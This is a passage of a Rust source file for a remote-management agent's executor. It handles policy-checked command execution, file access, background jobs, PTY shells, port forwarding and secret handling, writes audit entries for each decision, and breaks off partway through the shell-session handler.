//! Command execution with policy enforcement, timeout, and output limiting.

use std::collections::HashMap;
use std::sync::Arc;
use std::sync::atomic::{AtomicI64, AtomicU64, Ordering};
use std::time::Instant;

use chrono::Utc;
use tokio::process::Command;
use tokio::sync::RwLock;
use tokio::time::{Duration, timeout};

#[cfg(feature = "sysinfo")]
use tokio::sync::Mutex;

use rf_audit::logger::AuditLogger;
use rf_audit::types::AuditEntry;
use rf_crypto::secrets::SecretStore;
use rf_policy::rpc_policy::RpcPolicy;
use rf_rpc::types::{Action, Request, Response, RpcResult};

/// A completed background job.
struct CompletedJob {
    exit_code: i32,
    stdout: String,
    stderr: String,
}

/// State of a background job.
enum JobState {
    Running {
        #[allow(dead_code)] // Used for future signal forwarding
        pid: u32,
    },
    Completed(CompletedJob),
}

/// State of an active port forward.
struct ActiveForward {
    _handle: tokio::task::JoinHandle<()>,
    cancel: tokio::sync::watch::Sender<bool>,
    #[allow(dead_code)] // Kept for diagnostics/listing
    bind_addr: String,
}

/// Executor handles RPC requests under policy control.
pub struct Executor {
    policy: Arc<RwLock<RpcPolicy>>,
    audit: Arc<dyn AuditLogger>,
    caller_key: String,
    agent_id: String,
    /// Geographic region of this agent (from `raven.toml`).
    region: Option<String>,
    start_time: Instant,
    /// Background jobs tracked by job ID.
    jobs: Arc<tokio::sync::Mutex<HashMap<String, JobState>>>,
    /// Active shell sessions (PTY) with optional session recorder.
    #[cfg(unix)]
    shells: Arc<
        tokio::sync::Mutex<HashMap<String, (crate::pty::PtySession, crate::pty::SessionRecorder)>>,
    >,
    /// Active port forwards.
    forwards: Arc<tokio::sync::Mutex<HashMap<String, ActiveForward>>>,
    /// Sealed secret store for `{{ secrets.KEY }}` resolution in commands.
    secrets: Option<Arc<tokio::sync::Mutex<SecretStore>>>,
    /// Cached sysinfo System to avoid re-scanning on every metrics request.
    #[cfg(feature = "sysinfo")]
    sysinfo_cache: Arc<Mutex<sysinfo::System>>,
    /// Per-destination HTTP request timestamps for rate limiting.
    http_dest_rate: Arc<tokio::sync::Mutex<HashMap<String, std::collections::VecDeque<Instant>>>>,
    /// Optional version pin — `UpdateAgent` requests for a different version
    /// are rejected while a pin is active.
    pinned_version: Arc<RwLock<Option<String>>>,
    /// Optional maintenance window for auto-updates (e.g. `"02:00-04:00"`).
    /// `None` means updates are allowed at any time.
    update_window: Arc<RwLock<Option<String>>>,
    /// Optional webhook URL to POST update failure / rollback alerts to.
    alert_webhook: Arc<RwLock<Option<String>>>,
    /// Registry of external secret backends (Vault, AWS, Azure, GCP, generic HTTP).
    #[cfg(feature = "secret-backends")]
    backend_registry: Arc<tokio::sync::RwLock<crate::secret_backends::SecretBackendRegistry>>,

    // ── Prometheus metrics counters ──────────────────────────────────────
    /// Shared counter: total commands allowed.
    commands_allowed: Option<Arc<AtomicU64>>,
    /// Shared counter: total commands denied.
    commands_denied: Option<Arc<AtomicU64>>,
    /// Shared counter: total audit entries written.
    audit_entries: Option<Arc<AtomicU64>>,
    /// Shared counter: active connections.
    active_connections: Option<Arc<AtomicI64>>,
    /// Shared counter: total handshakes completed.
    handshakes_completed: Option<Arc<AtomicU64>>,
    /// Shared counter: cumulative handshake latency in microseconds.
    handshake_latency_us: Option<Arc<AtomicU64>>,
}

impl Executor {
    pub fn new(
        policy: Arc<RwLock<RpcPolicy>>,
        audit: Arc<dyn AuditLogger>,
        caller_key: String,
    ) -> Self {
        Self {
            policy,
            audit,
            caller_key,
            agent_id: String::new(),
            region: None,
            start_time: Instant::now(),
            jobs: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
            #[cfg(unix)]
            shells: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
            forwards: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
            secrets: None,
            #[cfg(feature = "sysinfo")]
            sysinfo_cache: Arc::new(Mutex::new(sysinfo::System::new())),
            http_dest_rate: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
            pinned_version: Arc::new(RwLock::new(None)),
            update_window: Arc::new(RwLock::new(None)),
            alert_webhook: Arc::new(RwLock::new(None)),
            #[cfg(feature = "secret-backends")]
            backend_registry: Arc::new(tokio::sync::RwLock::new(
                crate::secret_backends::SecretBackendRegistry::new(),
            )),
            commands_allowed: None,
            commands_denied: None,
            audit_entries: None,
            active_connections: None,
            handshakes_completed: None,
            handshake_latency_us: None,
        }
    }

    /// Set the agent ID for status reporting.
    pub fn with_agent_id(mut self, id: String) -> Self {
        self.agent_id = id;
        self
    }

    /// Set the geographic region for status reporting.
    pub fn with_region(mut self, region: Option<String>) -> Self {
        self.region = region;
        self
    }

    /// Set the start time for uptime calculation.
    pub fn with_start_time(mut self, start: Instant) -> Self {
        self.start_time = start;
        self
    }

    /// Set the sealed secret store for `{{ secrets.KEY }}` resolution.
    pub fn with_secrets(mut self, secrets: Arc<tokio::sync::Mutex<SecretStore>>) -> Self {
        self.secrets = Some(secrets);
        self
    }

    /// Wire Prometheus metrics counters into the executor.
    ///
    /// The counters are shared with [`RavenFabricMetricsCollector`] so that
    /// the `/metrics` endpoint reflects real-time activity.
    #[allow(clippy::too_many_arguments)]
    pub fn with_counters(
        mut self,
        commands_allowed: Option<Arc<AtomicU64>>,
        commands_denied: Option<Arc<AtomicU64>>,
        audit_entries: Option<Arc<AtomicU64>>,
        active_connections: Option<Arc<AtomicI64>>,
        handshakes_completed: Option<Arc<AtomicU64>>,
        handshake_latency_us: Option<Arc<AtomicU64>>,
    ) -> Self {
        self.commands_allowed = commands_allowed;
        self.commands_denied = commands_denied;
        self.audit_entries = audit_entries;
        self.active_connections = active_connections;
        self.handshakes_completed = handshakes_completed;
        self.handshake_latency_us = handshake_latency_us;
        self
    }

    /// Resolve `{{ secrets.KEY }}` patterns in a command string using the secret store.
    async fn resolve_secrets(&self, command: &str) -> Result<String, String> {
        if !command.contains("{{ secrets.") {
            return Ok(command.to_string());
        }
        match &self.secrets {
            Some(store) => {
                let store = store.lock().await;
                store
                    .resolve_template(command)
                    .map_err(|e| format!("secret resolution failed: {e}"))
            }
            None => Err("secrets not configured".to_string()),
        }
    }

    /// Handle an incoming RPC request.
    pub async fn handle(&self, request: Request) -> Response {
        let start = Instant::now();

        let result = match &request.action {
            Action::Execute {
                command,
                env,
                workdir,
            } => {
                self.handle_execute(
                    &request.id,
                    command,
                    env,
                    workdir,
                    start,
                    request.reason.clone(),
                )
                .await
            }
            #[cfg(feature = "sysinfo")]
            Action::Metrics => self.handle_metrics(&request.id, start).await,
            #[cfg(not(feature = "sysinfo"))]
            Action::Metrics => RpcResult::Error {
                message: "metrics not available (compiled without sysinfo feature)".into(),
            },
            Action::Status => self.handle_status(&request.id, start),
            Action::Read { path } => self.handle_read(&request.id, path, start).await,
            Action::Write { path, data, mode } => {
                self.handle_write(&request.id, path, data, *mode, start)
                    .await
            }
            Action::List { path } => self.handle_list(&request.id, path, start).await,
            Action::Signal { pid, signal } => self.handle_signal(&request.id, *pid, *signal, start),
            Action::BackgroundExec {
                command,
                env,
                workdir,
            } => {
                self.handle_background_exec(
                    &request.id,
                    command,
                    env,
                    workdir,
                    start,
                    request.reason.clone(),
                )
                .await
            }
            Action::JobQuery { job_id } => self.handle_job_query(job_id).await,
            Action::JobWait { job_id } => self.handle_job_wait(job_id).await,
            Action::Ping => RpcResult::Pong {
                timestamp_ms: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_millis() as u64,
            },
            #[cfg(unix)]
            Action::Shell {
                shell,
                rows,
                cols,
                env,
            } => {
                self.handle_shell_open(&request.id, shell.clone(), *rows, *cols, env.clone(), start)
                    .await
            }
            #[cfg(not(unix))]
            Action::Shell { .. } => RpcResult::Error {
                message: "shell sessions not supported on this platform".into(),
            },
            #[cfg(unix)]
            Action::ShellInput { session_id, data } => {
                self.handle_shell_input(&request.id, session_id, data, start)
                    .await
            }
            #[cfg(not(unix))]
            Action::ShellInput { .. } => RpcResult::Error {
                message: "shell sessions not supported on this platform".into(),
            },
            #[cfg(unix)]
            Action::ShellResize {
                session_id,
                rows,
                cols,
            } => self.handle_shell_resize(session_id, *rows, *cols).await,
            #[cfg(not(unix))]
            Action::ShellResize { .. } => RpcResult::Error {
                message: "shell sessions not supported on this platform".into(),
            },
            #[cfg(unix)]
            Action::ShellClose { session_id } => {
                self.handle_shell_close(&request.id, session_id, start)
                    .await
            }
            #[cfg(not(unix))]
            Action::ShellClose { .. } => RpcResult::Error {
                message: "shell sessions not supported on this platform".into(),
            },
            Action::PortForward {
                bind_addr,
                target_addr,
            } => {
                self.handle_port_forward(&request.id, bind_addr, target_addr, start)
                    .await
            }
            Action::PortForwardClose { forward_id } => {
                self.handle_port_forward_close(&request.id, forward_id, start)
                    .await
            }
            Action::RemoteForward {
                bind_addr,
                target_addr,
            } => {
                self.handle_remote_forward(&request.id, bind_addr, target_addr, start)
                    .await
            }
            Action::Socks5Forward { bind_addr } => {
                self.handle_socks5_forward(&request.id, bind_addr, start)
                    .await
            }
            Action::Socks5Close { forward_id } => {
                self.handle_port_forward_close(&request.id, forward_id, start)
                    .await
            }
            Action::HealthCheck {
                probe_type,
                target,
                timeout_ms,
            } => {
                self.handle_health_check(&request.id, probe_type, target, *timeout_ms, start)
                    .await
            }
            Action::TailLog { path, lines } => {
                self.handle_tail_log(&request.id, path, *lines, start).await
            }
            Action::StreamExecute {
                command,
                env,
                workdir,
            } => {
                // StreamExecute runs synchronously (like Execute) when no streaming
                // channel is available. The full streaming path uses stream_execute()
                // directly from the agent's RPC loop with a mpsc sender.
                self.handle_execute(
                    &request.id,
                    command,
                    env,
                    workdir,
                    start,
                    request.reason.clone(),
                )
                .await
            }
            Action::FilePush {
                path,
                offset,
                data,
                done,
                checksum,
                mode,
                compress,
            } => {
                self.handle_file_push(
                    &request.id,
                    path,
                    *offset,
                    data,
                    *done,
                    checksum,
                    *mode,
                    *compress,
                    start,
                )
                .await
            }
            Action::FilePull {
                path,
                offset,
                max_chunk,
                compress,
            } => {
                self.handle_file_pull(&request.id, path, *offset, *max_chunk, *compress, start)
                    .await
            }
            Action::Proxy {
                target,
                idle_timeout_secs,
                max_duration_secs,
            } => {
                self.handle_proxy(
                    &request.id,
                    target,
                    *idle_timeout_secs,
                    *max_duration_secs,
                    start,
                )
                .await
            }
            Action::HttpForward {
                target,
                method,
                path,
                headers,
                body,
            } => {
                self.handle_http_forward(&request.id, target, method, path, headers, body, start)
                    .await
            }
            Action::RotateSecret { name } => {
                self.handle_rotate_secret(&request.id, name, start).await
            }
            Action::SetSecretRotation {
                name,
                ttl_secs,
                hook,
                grace_period_secs,
                health_check,
            } => {
                self.handle_set_secret_rotation(
                    &request.id,
                    name,
                    *ttl_secs,
                    hook.as_deref(),
                    *grace_period_secs,
                    health_check.as_deref(),
                    start,
                )
                .await
            }
            #[cfg(feature = "secret-backends")]
            Action::ConfigureSecretBackend {
                name,
                backend_type,
                config,
                sync_interval_secs,
                sync_paths,
            } => {
                self.handle_configure_secret_backend(
                    &request.id,
                    name,
                    backend_type,
                    config,
                    *sync_interval_secs,
                    sync_paths,
                    start,
                )
                .await
            }
            #[cfg(feature = "secret-backends")]
            Action::FetchFromBackend { backend, path } => {
                self.handle_fetch_from_backend(&request.id, backend, path, start)
                    .await
            }
            Action::SealSecret {
                name,
                value,
                grace_period_secs,
            } => {
                self.handle_seal_secret(&request.id, name, value, *grace_period_secs, start)
                    .await
            }
            Action::ListSecrets => self.handle_list_secrets(&request.id, start).await,
            Action::FileDeltaQuery { path, block_size } => {
                self.handle_file_delta_query(&request.id, path, *block_size, start)
                    .await
            }
            Action::FileDeltaPatch {
                path,
                block_size,
                patches,
                total_size,
                checksum,
                mode,
            } => {
                self.handle_file_delta_patch(
                    &request.id,
                    path,
                    *block_size,
                    patches,
                    *total_size,
                    checksum,
                    *mode,
                    start,
                )
                .await
            }
            Action::IngressRegister {
                agent_id,
                upstream_url,
                subdomain,
                path_prefix,
            } => {
                self.handle_ingress_register(
                    &request.id,
                    agent_id,
                    upstream_url,
                    subdomain.as_deref(),
                    path_prefix.as_deref(),
                    start,
                )
                .await
            }
            Action::ReverseProxy {
                method,
                path,
                query,
                headers,
                body,
                upstream_url,
                timeout_ms,
                max_response_bytes,
            } => {
                self.handle_reverse_proxy(
                    &request.id,
                    method,
                    path,
                    query.as_deref(),
                    headers,
                    body.as_deref(),
                    upstream_url,
                    *timeout_ms,
                    *max_response_bytes,
                    start,
                )
                .await
            }
            Action::CheckUpdate { current_version } => {
                self.handle_check_update(&request.id, current_version, start)
                    .await
            }
            Action::UpdateAgent {
                version,
                url,
                sha256,
                ed25519_sig: _,
                allow_downgrade,
            } => {
                self.handle_update_agent(&request.id, version, url, sha256, *allow_downgrade, start)
                    .await
            }
            Action::PinVersion { version } => {
                self.handle_pin_version(&request.id, version, start).await
            }
            Action::UnpinVersion => self.handle_unpin_version(&request.id, start).await,
            Action::GetVersionInfo => self.handle_get_version_info(&request.id, start).await,
            Action::SetUpdateWindow { window } => {
                self.handle_set_update_window(&request.id, window.as_deref(), start)
                    .await
            }
            Action::RolloutHealthCheck => {
                self.handle_rollout_health_check(&request.id, start).await
            }
            Action::SetAlertWebhook { url } => {
                self.handle_set_alert_webhook(&request.id, url.as_deref(), start)
                    .await
            }
            _ => RpcResult::Error {
                message: format!("unsupported action: {:?}", request.action),
            },
        };

        Response {
            id: request.id,
            result,
        }
    }

    /// Increment the `commands_allowed` or `commands_denied` counter based on
    /// a policy decision.  No-op if counters were not wired via [`with_counters`].
    fn record_policy_decision(&self, allowed: bool) {
        if allowed {
            if let Some(ref c) = self.commands_allowed {
                c.fetch_add(1, Ordering::Relaxed);
            }
        } else if let Some(ref c) = self.commands_denied {
            c.fetch_add(1, Ordering::Relaxed);
        }
    }

    /// Increment the `audit_entries` Prometheus counter if wired.
    /// Used by code paths that write audit entries directly via `self.audit.log()`
    /// rather than through the `self.audit()` helper (which already increments it).
    fn record_audit_entry(&self) {
        if let Some(ref c) = self.audit_entries {
            c.fetch_add(1, Ordering::Relaxed);
        }
    }

    /// Write an audit log entry, logging errors via tracing.
    /// Increments the `audit_entries` Prometheus counter if wired.
    #[allow(clippy::too_many_arguments)]
    fn audit(
        &self,
        request_id: &str,
        action: &str,
        command: Option<String>,
        decision: &str,
        matched_rule: String,
        exit_code: Option<i32>,
        duration_ms: u64,
        reason: Option<String>,
    ) {
        if let Err(e) = self.audit.log(AuditEntry {
            timestamp: Utc::now(),
            request_id: request_id.to_string(),
            action: action.into(),
            command,
            decision: decision.into(),
            matched_rule,
            exit_code,
            duration_ms,
            caller_key: self.caller_key.clone(),
            reason,
            prev_hash: None,
            hmac: None,
        }) {
            tracing::error!("audit log write failed: {e}");
        }
        if let Some(ref c) = self.audit_entries {
            c.fetch_add(1, Ordering::Relaxed);
        }
    }

    #[allow(clippy::too_many_arguments)]
    async fn handle_execute(
        &self,
        request_id: &str,
        command: &str,
        env: &std::collections::HashMap<String, String>,
        workdir: &Option<String>,
        start: Instant,
        reason: Option<String>,
    ) -> RpcResult {
        let policy = self.policy.read().await;

        // Policy check
        let decision = policy.check_command(command);
        let duration_ms = start.elapsed().as_millis() as u64;

        if !decision.allowed {
            if let Err(e) = self.audit.log(AuditEntry {
                timestamp: Utc::now(),
                request_id: request_id.to_string(),
                action: "execute".into(),
                command: Some(command.to_string()),
                decision: "denied".into(),
                matched_rule: decision.matched_rule.clone(),
                exit_code: None,
                duration_ms,
                caller_key: self.caller_key.clone(),
                reason: reason.clone(),
                prev_hash: None,
                hmac: None,
            }) {
                tracing::error!("audit log write failed: {}", e);
            }
            self.record_policy_decision(false);
            self.record_audit_entry();

            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }

        self.record_policy_decision(true);

        // Execute with timeout
        let timeout_dur = Duration::from_secs(policy.timeout_seconds as u64);
        let max_output = policy.max_output_bytes as usize;
        drop(policy); // Release read lock before spawning

        // Resolve {{ secrets.KEY }} patterns in the command
        let resolved_command = match self.resolve_secrets(command).await {
            Ok(cmd) => cmd,
            Err(e) => {
                return RpcResult::Error { message: e };
            }
        };

        let mut cmd = Command::new("sh");
        cmd.arg("-c").arg(&resolved_command);

        if let Some(dir) = workdir {
            cmd.current_dir(dir);
        }

        for (k, v) in env {
            cmd.env(k, v);
        }

        let output = match timeout(timeout_dur, cmd.output()).await {
            Ok(Ok(output)) => output,
            Ok(Err(e)) => {
                return RpcResult::Error {
                    message: format!("spawn failed: {e}"),
                };
            }
            Err(_) => {
                return RpcResult::Error {
                    message: format!("timeout after {}s", timeout_dur.as_secs()),
                };
            }
        };

        let stdout = String::from_utf8_lossy(&output.stdout[..output.stdout.len().min(max_output)])
            .to_string();
        let stderr = String::from_utf8_lossy(&output.stderr[..output.stderr.len().min(max_output)])
            .to_string();
        let exit_code = output.status.code().unwrap_or(-1);
        let duration_ms = start.elapsed().as_millis() as u64;

        if let Err(e) = self.audit.log(AuditEntry {
            timestamp: Utc::now(),
            request_id: request_id.to_string(),
            action: "execute".into(),
            command: Some(command.to_string()),
            decision: "allowed".into(),
            matched_rule: decision.matched_rule,
            exit_code: Some(exit_code),
            duration_ms,
            caller_key: self.caller_key.clone(),
            reason,
            prev_hash: None,
            hmac: None,
        }) {
            tracing::error!("audit log write failed: {}", e);
        }
        self.record_audit_entry();

        RpcResult::Success {
            stdout,
            stderr,
            exit_code,
            duration_ms,
        }
    }

    #[cfg(feature = "sysinfo")]
    async fn handle_metrics(&self, request_id: &str, start: Instant) -> RpcResult {
        let mut sys = self.sysinfo_cache.lock().await;
        // Only refresh CPU and memory — avoids loading processes/disks
        // which saves ~5-15 MB RSS on every poll.
        sys.refresh_cpu_all();
        sys.refresh_memory();
        let stdout = format!(
            "{{\"hostname\":\"{}\",\"cpus\":{},\"memory_total_mb\":{},\"memory_used_mb\":{}}}",
            sysinfo::System::host_name().unwrap_or_default(),
            sys.cpus().len(),
            sys.total_memory() / 1024 / 1024,
            sys.used_memory() / 1024 / 1024,
        );

        self.audit(
            request_id,
            "metrics",
            None,
            "allowed",
            "built-in".into(),
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );

        RpcResult::Success {
            stdout,
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }
    }

    fn handle_status(&self, request_id: &str, start: Instant) -> RpcResult {
        self.audit(
            request_id,
            "status",
            None,
            "allowed",
            "built-in".into(),
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );
        RpcResult::StatusInfo {
            agent_id: self.agent_id.clone(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            uptime_seconds: self.start_time.elapsed().as_secs(),
            region: self.region.clone(),
        }
    }

    async fn handle_read(&self, request_id: &str, path: &str, start: Instant) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check (check_path resolves symlinks internally)
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            self.audit(
                request_id,
                "read",
                Some(path.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();
        let max_output = policy.max_output_bytes as usize;
        drop(policy);

        // Resolve for actual read
        let resolved = match tokio::fs::canonicalize(path).await {
            Ok(p) => p,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("resolve path: {e}"),
                };
            }
        };

        match tokio::fs::read(&resolved).await {
            Ok(data) => {
                let truncated = if data.len() > max_output {
                    data[..max_output].to_vec()
                } else {
                    data
                };
                // Return file content as base64 in stdout
                use base64::Engine;
                let encoded = base64::engine::general_purpose::STANDARD.encode(&truncated);
                self.audit(
                    request_id,
                    "read",
                    Some(path.to_string()),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                RpcResult::Success {
                    stdout: encoded,
                    stderr: String::new(),
                    exit_code: 0,
                    duration_ms: 0,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("read file: {e}"),
            },
        }
    }

    async fn handle_write(
        &self,
        request_id: &str,
        path: &str,
        data: &[u8],
        mode: Option<u32>,
        start: Instant,
    ) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            self.audit(
                request_id,
                "write",
                Some(path.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        // Atomic write: write to temp file then rename
        let temp_path = format!("{path}.rf_tmp");
        if let Err(e) = tokio::fs::write(&temp_path, data).await {
            return RpcResult::Error {
                message: format!("write temp file: {e}"),
            };
        }

        // Set permissions if specified (Unix only)
        #[cfg(unix)]
        if let Some(m) = mode {
            use std::os::unix::fs::PermissionsExt;
            let perms = std::fs::Permissions::from_mode(m);
            if let Err(e) = tokio::fs::set_permissions(&temp_path, perms).await {
                let _ = tokio::fs::remove_file(&temp_path).await;
                return RpcResult::Error {
                    message: format!("set permissions: {e}"),
                };
            }
        }
        // On non-Unix, mode is ignored
        #[cfg(not(unix))]
        let _ = mode;

        // Atomic rename
        if let Err(e) = tokio::fs::rename(&temp_path, path).await {
            let _ = tokio::fs::remove_file(&temp_path).await;
            return RpcResult::Error {
                message: format!("rename: {e}"),
            };
        }

        self.audit(
            request_id,
            "write",
            Some(path.to_string()),
            "allowed",
            matched_rule,
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );

        RpcResult::Success {
            stdout: format!("wrote {} bytes to {}", data.len(), path),
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }
    }

    async fn handle_list(&self, request_id: &str, path: &str, start: Instant) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            self.audit(
                request_id,
                "list",
                Some(path.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        // Resolve symlinks
        let resolved = match tokio::fs::canonicalize(path).await {
            Ok(p) => p,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("resolve path: {e}"),
                };
            }
        };

        let mut entries = Vec::new();
        let mut dir = match tokio::fs::read_dir(&resolved).await {
            Ok(d) => d,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("read dir: {e}"),
                };
            }
        };

        while let Ok(Some(entry)) = dir.next_entry().await {
            let name = entry.file_name().to_string_lossy().to_string();
            let is_dir = entry.file_type().await.map(|t| t.is_dir()).unwrap_or(false);
            entries.push(if is_dir { format!("{name}/") } else { name });
        }

        entries.sort();
        self.audit(
            request_id,
            "list",
            Some(path.to_string()),
            "allowed",
            matched_rule,
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );
        RpcResult::Success {
            stdout: entries.join("\n"),
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }
    }

    fn handle_signal(&self, request_id: &str, pid: u32, signal: i32, start: Instant) -> RpcResult {
        // Policy check — treat signal as a command
        let cmd_repr = format!("kill -{signal} {pid}");
        let policy = self.policy.blocking_read();
        let decision = policy.check_command(&cmd_repr);
        if !decision.allowed {
            self.audit(
                request_id,
                "signal",
                Some(cmd_repr),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        #[cfg(unix)]
        {
            // Send signal to process
            let result = unsafe { libc::kill(pid as libc::pid_t, signal as libc::c_int) };
            if result == 0 {
                self.audit(
                    request_id,
                    "signal",
                    Some(cmd_repr),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                RpcResult::Success {
                    stdout: format!("signal {signal} sent to pid {pid}"),
                    stderr: String::new(),
                    exit_code: 0,
                    duration_ms: 0,
                }
            } else {
                self.audit(
                    request_id,
                    "signal",
                    Some(cmd_repr),
                    "allowed",
                    matched_rule,
                    Some(-1),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                RpcResult::Error {
                    message: format!(
                        "kill({}, {}): {}",
                        pid,
                        signal,
                        std::io::Error::last_os_error()
                    ),
                }
            }
        }
        #[cfg(not(unix))]
        {
            let _ = (pid, signal, cmd_repr, matched_rule, request_id, start);
            RpcResult::Error {
                message: "signal not supported on this platform".into(),
            }
        }
    }

    async fn handle_background_exec(
        &self,
        request_id: &str,
        command: &str,
        env: &std::collections::HashMap<String, String>,
        workdir: &Option<String>,
        start: Instant,
        reason: Option<String>,
    ) -> RpcResult {
        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_command(command);
        if !decision.allowed {
            self.audit(
                request_id,
                "background_exec",
                Some(command.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                reason.clone(),
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();
        let max_output = policy.max_output_bytes as usize;
        drop(policy);

        let mut cmd = Command::new("sh");
        cmd.arg("-c").arg(command);
        if let Some(dir) = workdir {
            cmd.current_dir(dir);
        }
        for (k, v) in env {
            cmd.env(k, v);
        }

        let child = match cmd
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
        {
            Ok(child) => child,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("spawn failed: {e}"),
                };
            }
        };

        let pid = child.id().unwrap_or(0);
        let job_id = uuid::Uuid::new_v4().to_string();

        // Store job as running
        {
            let mut jobs = self.jobs.lock().await;
            jobs.insert(job_id.clone(), JobState::Running { pid });
        }

        self.audit(
            request_id,
            "background_exec",
            Some(command.to_string()),
            "allowed",
            matched_rule,
            None,
            start.elapsed().as_millis() as u64,
            reason,
        );

        // Spawn background task to wait for completion
        let jobs = self.jobs.clone();
        let job_id_clone = job_id.clone();
        tokio::spawn(async move {
            match child.wait_with_output().await {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(
                        &output.stdout[..output.stdout.len().min(max_output)],
                    )
                    .to_string();
                    let stderr = String::from_utf8_lossy(
                        &output.stderr[..output.stderr.len().min(max_output)],
                    )
                    .to_string();
                    let exit_code = output.status.code().unwrap_or(-1);
                    let mut jobs = jobs.lock().await;
                    jobs.insert(
                        job_id_clone,
                        JobState::Completed(CompletedJob {
                            exit_code,
                            stdout,
                            stderr,
                        }),
                    );
                }
                Err(_) => {
                    let mut jobs = jobs.lock().await;
                    jobs.insert(
                        job_id_clone,
                        JobState::Completed(CompletedJob {
                            exit_code: -1,
                            stdout: String::new(),
                            stderr: "process wait failed".into(),
                        }),
                    );
                }
            }
        });

        RpcResult::JobStarted { job_id, pid }
    }

    async fn handle_job_query(&self, job_id: &str) -> RpcResult {
        let jobs = self.jobs.lock().await;
        match jobs.get(job_id) {
            Some(JobState::Running { .. }) => RpcResult::JobStatus {
                job_id: job_id.into(),
                running: true,
                exit_code: None,
                stdout: None,
                stderr: None,
            },
            Some(JobState::Completed(job)) => RpcResult::JobStatus {
                job_id: job_id.into(),
                running: false,
                exit_code: Some(job.exit_code),
                stdout: Some(job.stdout.clone()),
                stderr: Some(job.stderr.clone()),
            },
            None => RpcResult::Error {
                message: format!("unknown job: {job_id}"),
            },
        }
    }

    async fn handle_job_wait(&self, job_id: &str) -> RpcResult {
        // Poll until complete (with timeout)
        let deadline = tokio::time::Instant::now() + Duration::from_secs(300);
        loop {
            {
                let jobs = self.jobs.lock().await;
                if let Some(JobState::Completed(job)) = jobs.get(job_id) {
                    return RpcResult::JobStatus {
                        job_id: job_id.into(),
                        running: false,
                        exit_code: Some(job.exit_code),
                        stdout: Some(job.stdout.clone()),
                        stderr: Some(job.stderr.clone()),
                    };
                }
                if !jobs.contains_key(job_id) {
                    return RpcResult::Error {
                        message: format!("unknown job: {job_id}"),
                    };
                }
            }
            if tokio::time::Instant::now() > deadline {
                return RpcResult::Error {
                    message: format!("timeout waiting for job: {job_id}"),
                };
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
    }

    // --- Shell session handlers ---

    #[cfg(unix)]
    async fn handle_shell_open(
        &self,
        request_id: &str,
        shell: Option<String>,
        rows: u16,
        cols: u16,
        env: HashMap<String, String>,
        start: Instant,
    ) -> RpcResult {
        use crate::pty::{PtyConfig, PtySession, SessionRecorder, TerminalSize};

        // Policy check — opening a shell is equivalent to running the shell command
        let shell_bin = shell
            .clone()
            .or_else(|| std::env::var("SHELL").ok())
            .unwrap_or_else(|| "/bin/sh".to_string());
        let policy = self.policy.read().await;
        let decision = policy.check_command(&shell_bin);
        if !decision.allowed {
            self.audit(
                request_id,
                "shell_open",
                Some(shell_bin.clone()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        let config = PtyConfig {
            shell,
